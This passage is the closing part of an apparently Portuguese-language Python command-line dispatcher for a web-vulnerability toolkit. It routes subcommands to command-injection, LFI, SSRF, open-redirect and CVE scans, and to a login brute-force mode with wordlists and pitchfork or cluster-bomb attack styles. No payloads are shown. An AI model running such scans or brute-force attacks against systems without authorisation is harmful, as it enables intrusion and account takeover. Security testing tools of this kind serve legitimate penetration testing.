                validate_execution=getattr(args, 'validate_execution', True),
                analyze_csp=getattr(args, 'analyze_csp', True),
                verbose=getattr(args, 'verbose', False))
    elif args.tool == 'cmd-scan':
        command_injection_scan(args.url)
    elif args.tool == 'lfi-scan':
        # Limitar threads para evitar sobrecarga
        max_threads = min(args.threads, 20)
        if args.threads > 20:
            console.print(f"[yellow][!] Limitando threads de {args.threads} para 20 para evitar sobrecarga do sistema[/yellow]")
        
        lfi_scan(
            args.url, 
            timeout=args.timeout, 
            threads=max_threads, 
            export_results=args.export, 
            verbose=args.verbose,
            fast_mode=args.fast,
            stop_on_first=args.stop_on_first
        )
    elif args.tool == 'ssrf-scan':
        ssrf_scan(args.url)
    elif args.tool == 'open-redirect-scan':
        open_redirect_scan(args.url)
    elif args.tool == 'full-scan':
        full_scan(args.url, args.output, args.min_cvss, args.no_cache)
    elif args.tool == 'view':
        view_file_from_url(args.url)
    elif args.tool == 'cve-scan':
        cve_scan(args.product, args.version, args.min_cvss, args.no_cache)
    elif args.tool == 'brute-force':
        # Validação inicial rápida
        if not args.failure_string and not args.success_string:
            console.print("\n[bold red]✗ Erro:[/bold red] Pelo menos um de --failure-string ou --success-string deve ser fornecido.")
            console.print("[dim]Use --help para ver exemplos de uso.[/dim]\n")
            return
        
        # Validação de arquivos essenciais
        if not os.path.exists(args.wordlist):
            console.print(f"\n[bold red]✗ Erro:[/bold red] Arquivo de wordlist '{args.wordlist}' não encontrado.")
            console.print("[dim]Verifique o caminho do arquivo e tente novamente.[/dim]\n")
            return
        
        if args.attack_mode in ['pitchfork', 'cluster_bomb'] and args.user_list and not os.path.exists(args.user_list):
            console.print(f"\n[bold red]✗ Erro:[/bold red] Arquivo de usuários '{args.user_list}' não encontrado.")
            console.print("[dim]Verifique o caminho do arquivo e tente novamente.[/dim]\n")
            return
        
        brute_force_scan(args.url, args.user_field, args.pass_field, args.username, args.user_list, args.wordlist, 
                         args.failure_string, args.success_string, args.workers, args.delay, args.attack_mode,
                         args.max_retries, args.backoff_factor, args.session_pool_size, args.enable_logging)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()
    